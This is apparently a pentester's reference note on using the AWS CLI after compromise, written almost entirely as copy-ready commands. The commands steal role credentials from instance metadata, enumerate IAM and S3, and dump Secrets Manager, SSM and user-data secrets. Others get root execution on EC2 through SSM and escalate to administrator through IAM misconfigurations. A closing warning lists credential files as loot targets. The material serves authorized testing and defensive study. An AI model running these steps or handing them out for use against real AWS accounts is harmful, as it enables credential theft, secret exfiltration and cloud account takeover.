# AWS CLI

**Tags:** `#aws` `#cloud` `#awscli` `#postexploitation` `#credentialabuse` `#privesc` `#imds` `#ssm`

Official command-line client for Amazon Web Services. In an engagement it's the primary tool
for using stolen/assumed AWS credentials — validate them (`sts get-caller-identity`),
enumerate what they can reach (S3, Secrets Manager, IAM), loot secrets, run code on EC2 via
SSM, and escalate through IAM misconfigurations. Reads credentials from `~/.aws/credentials`,
`AWS_ACCESS_KEY_ID`/`AWS_SECRET_ACCESS_KEY`/`AWS_SESSION_TOKEN` env vars, or instance/container
metadata — all of which are credential-hunting targets on a compromised host.

**Source:** https://aws.amazon.com/cli/
**Install:** `pip install awscli` or `sudo apt install awscli`

```bash
# Set stolen temporary credentials (e.g. from IMDS) — session token is required for temp creds
export AWS_ACCESS_KEY_ID="<AccessKeyId>"
export AWS_SECRET_ACCESS_KEY="<SecretAccessKey>"
export AWS_SESSION_TOKEN="<Token>"
export AWS_DEFAULT_REGION="us-east-1"

# Or persist a named profile and use --profile on each command
aws configure --profile loot
aws sts get-caller-identity --profile loot
```

---

## Steal Credentials from IMDS

The classic foothold pivot — from SSRF or code-exec on an EC2 instance, pull the attached
role's temporary keys. IMDSv2 requires a token first (v1 is a bare GET):

```bash
# IMDSv2 (token-based, now the default)
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
        -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
     http://169.254.169.254/latest/meta-data/iam/security-credentials/          # role name
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
     http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>    # AccessKeyId/Secret/Token

# IMDSv1 (if still enabled) — no token needed
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
```

ECS/container creds live at `http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI`.

---

## Who Am I / Assume Roles

```bash
aws sts get-caller-identity                              # ARN + account of the current creds
aws sts assume-role --role-arn arn:aws:iam::<acct>:role/<role> --role-session-name x   # pivot to another role
aws sts get-session-token                                # MFA-elevated session (if creds allow)
```

---

## Enumerate Permissions & Resources

```bash
# The single most useful IAM recon call — dumps every user/role/group/policy at once
aws iam get-account-authorization-details

aws iam list-users ; aws iam list-roles
aws iam list-attached-user-policies --user-name <me>     # what am I allowed to do?
aws s3 ls                                                # buckets; then: aws s3 ls s3://bucket --recursive
aws ec2 describe-instances --query 'Reservations[].Instances[].[InstanceId,PrivateIpAddress]'
```

---

## Loot Secrets

```bash
aws secretsmanager list-secrets
aws secretsmanager get-secret-value --secret-id <name> --query SecretString --output text

# SSM Parameter Store — SecureString params decrypt with one flag
aws ssm describe-parameters
aws ssm get-parameters-by-path --path / --recursive --with-decryption
aws ssm get-parameter --name <name> --with-decryption --query Parameter.Value --output text

# EC2 user-data frequently contains bootstrap secrets / creds
aws ec2 describe-instance-attribute --instance-id <id> --attribute userData --query UserData --output text | base64 -d
```

---

## Code Execution on EC2 (via SSM — no SSH needed)

The AWS analog of `az vm run-command`: if the instance runs the SSM agent and your creds have
`ssm:SendCommand`, you get RCE as **root/SYSTEM** with no network path to the host.

```bash
aws ssm send-command --document-name "AWS-RunShellScript" \
  --targets "Key=instanceids,Values=i-0123456789abcdef0" \
  --parameters 'commands=["id","hostname"]'

# Retrieve the output (command-id comes back from send-command)
aws ssm list-command-invocations --command-id <id> --details \
  --query 'CommandInvocations[].CommandPlugins[].Output'
```

---

## IAM Privilege Escalation Primitives

Which of these works depends on the exact permission you hold — enumerate first, then pick:

```bash
# Have iam:AttachUserPolicy → grant yourself admin
aws iam attach-user-policy --user-name <me> --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Have iam:CreateAccessKey → mint keys for a more-privileged user
aws iam create-access-key --user-name <privileged-user>

# Have iam:CreatePolicyVersion → rewrite an attached policy to allow '*' and set it default
aws iam create-policy-version --policy-arn <arn> --policy-document file://admin.json --set-as-default

# Have iam:PassRole + a compute service → run code under a privileged role
aws lambda update-function-code --function-name <fn> --zip-file fileb://payload.zip
```

> [!warning] `aws configure` writes long-term keys to `~/.aws/credentials` in **cleartext**.
> On a compromised host that file (and `~/.aws/config`, shell history with exported keys, CI
> env files, `.env`) is a top credential-loot target. Clear your own after an engagement.

> [!note] **See also** — [[Services/Cloud & Data/Databricks|Databricks]], [[Services/Cloud & Data/Flink|Flink]], [[Services/Cloud & Data/Kafka|Kafka]] and [[Services/Cloud & Data/Kubernetes|Kubernetes]] (using cluster/pod-IMDS-stolen IAM role creds after code exec). For automated AWS enumeration/privesc see [[Tools/Cloud/Pacu|Pacu]] and [[Tools/Cloud/ScoutSuite|ScoutSuite]]. The Azure equivalent workflow is [[Tools/Cloud/azure-cli|azure-cli]].

---

*Created: 2026-07-28*
*Updated: 2026-09-28*
*Model: claude-opus-4-8*
